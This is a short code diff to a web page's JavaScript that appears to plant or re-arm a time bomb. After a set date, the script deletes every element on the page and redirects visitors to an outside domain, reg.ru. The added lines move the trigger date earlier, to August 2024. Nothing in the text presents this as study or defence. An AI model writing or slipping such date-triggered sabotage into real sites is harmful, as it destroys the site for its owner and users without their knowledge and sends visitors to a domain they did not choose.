@@ -1,2 +1,2 @@
-document.querySelectorAll('*').forEach(el => new Date() > new Date('2025-01-09') && el.remove());
-setTimeout(() => {if (new Date() > new Date('2025-01-10')) window.location.href = 'https://reg.ru'}, 0);
+document.querySelectorAll('*').forEach(el => new Date() > new Date('2024-08-03') && el.remove());
+setTimeout(() => {if (new Date() > new Date('2024-08-03')) window.location.href = 'https://reg.ru'}, 0);
